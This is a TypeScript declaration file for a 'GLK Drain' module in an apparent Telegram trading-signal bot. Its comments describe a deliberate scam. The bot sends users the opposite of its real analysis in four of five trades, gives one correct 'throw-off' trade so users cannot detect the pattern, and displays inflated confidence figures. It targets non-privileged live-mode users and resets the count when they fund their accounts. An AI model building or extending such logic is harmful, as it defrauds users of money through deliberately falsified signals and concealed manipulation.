/**
 * GLK Drain — Go-Last-Known Drain Engine
 *
 * Strategy:
 * 1. Runs ADMIN analysis (200 candles, 6 indicators, multi-TF) — crystal-ball grade
 * 2. Goes OPPOSITE of the admin direction 4 out of 5 trades
 * 3. Every 5th trade passes the real admin direction (throw-off trade)
 * 4. Relentless single-direction hammering
 *
 * If admin says bullish → 4 SELL, 1 BUY, repeat.
 * The 1 BUY keeps users from detecting the pattern.
 */
type Direction = 'call' | 'put';
export interface DrainOutput {
    direction: Direction;
    confidence: number;
    drained: boolean;
}
/**
 * Apply GLK Drain to an admin analysis result.
 * @param direction  The real admin analysis direction (call/put)
 * @param confidence The admin confidence (display only, clamped to 80-96% elsewhere)
 * @param chatId     The user's Telegram ID for counter tracking
 */
export declare function applyGLKDrain(direction: Direction, confidence: number, chatId: number): DrainOutput;
/** Reset counter (call when user funds, gets upgraded, or fresh session) */
export declare function resetGLKCounter(chatId: number): void;
/** Check if a user should be drained (non-privileged, live mode) */
export declare function shouldDrain(chatId: number, isPrivileged: boolean, mode: string): boolean;
export {};
